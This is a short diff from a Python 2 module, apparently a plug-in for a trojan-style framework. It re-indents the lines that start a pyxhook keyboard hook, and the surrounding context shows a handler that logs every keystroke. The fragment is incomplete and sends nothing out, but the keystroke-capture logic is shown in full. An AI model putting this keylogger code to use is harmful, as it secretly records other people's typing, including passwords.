@@ -7,10 +7,10 @@ def run(**args):
          chr(event.Ascii)
          logging.log(10,chr(event.Ascii))
          return True
-       hookman = pyxhook.HookManager()
-       hookman.KeyDown = kbevent
-       hookman.HookKeyboard()
-       hookman.start()
+      hookman = pyxhook.HookManager()
+      hookman.KeyDown = kbevent
+      hookman.HookKeyboard()
+      hookman.start()
   except Exception, e:
       return str(e)
   
